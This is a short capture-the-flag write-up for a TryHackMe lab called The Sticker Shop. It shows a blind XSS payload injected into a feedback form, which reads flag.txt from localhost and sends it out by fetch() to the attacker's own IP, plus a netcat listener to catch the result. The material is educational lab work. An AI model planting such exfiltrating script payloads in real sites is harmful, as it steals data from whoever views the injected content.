---
title: The Sticker Shop
tags:
  - thm
  - easy
---

#### Author: **Xera**

---

![image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6G6WWpl_fDJbtGklkH-osQ.png)

This is a writeup for The Sticker Shop room.

My target IP: 10.10.181.215

---

The goal of this challenge is to exploit the website and read the flag located at:

http://10.10.181.215:8080/flag.txt

![image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bfF-Gp-SrOfkQhCZDRD2ZQ.jpeg)

---

In the Feedback page, we will implement Blind XSS.

```bash
'"><script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://<YOUR-IP-ADDRESS-tun0>:8000/?flag=' + encodeURIComponent(data));
    });
</script>
```

![image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*l1cXVeHiF-4K9o7PtlGo3w.jpeg)

But firstly, we need to start the netcat listener before entering the code.

<b>nc -lvnp 8000</b>

Once we execute the code, the flag will appear.

![image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3ESsPXJK3E9g5XU8T7WpEA.png)
